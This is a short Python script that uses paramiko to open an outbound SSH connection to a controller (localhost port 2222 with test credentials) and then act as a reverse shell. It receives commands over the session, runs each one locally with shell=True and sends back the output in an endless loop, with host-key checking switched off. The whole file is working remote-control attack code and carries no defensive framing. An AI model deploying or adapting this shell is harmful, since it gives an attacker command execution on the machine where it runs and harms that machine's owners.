#!/usr/bin/env python

import subprocess

import paramiko


def ssh_command(host, user, passwd, command, port=22):
    '''
    Connect by SSH to a host server with username and password and
    :param host:
    :param user: Username
    :param passwd: Password
    :param command: Shell command to exectute on the local host.
    :param port: Defauly SSH port 22
    :return: Nothing
    '''
    client = paramiko.SSHClient()
    # client.load_host_keys('/user/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(hostname=host, port=port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024))  # read banner
        while True:
            command = ssh_session.recv(1024)  # get command from SSH server
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(e)
        client.close()  # unreachable
    return


ssh_command('127.0.0.1', user='test', passwd='testpwd', command='ClientConnected', port=2222)
